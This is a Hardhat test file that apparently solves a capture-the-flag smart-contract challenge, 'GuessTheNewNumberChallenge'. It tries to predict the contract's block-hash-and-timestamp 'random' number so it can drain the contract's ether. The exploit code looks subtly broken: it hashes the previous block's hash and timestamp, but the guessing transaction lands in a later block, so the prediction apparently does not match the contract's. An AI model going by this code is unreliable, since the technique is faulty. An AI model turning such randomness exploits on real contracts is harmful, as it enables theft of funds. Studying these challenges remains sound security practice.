import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {
      const blockNumber = await ethers.provider.getBlockNumber();
      const previousBlock = await ethers.provider.getBlock(blockNumber - 1);

      const blockHash = previousBlock.hash;
      const timestamp = previousBlock.timestamp;
      
      const packed = ethers.utils.solidityPack(["bytes32", "uint256"], [blockHash, timestamp]);
      const hash = ethers.utils.keccak256(packed);

      const guess = parseInt(hash.slice(-2), (16));

      await target.guess(guess, {value: ethers.utils.parseEther("1")});

    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
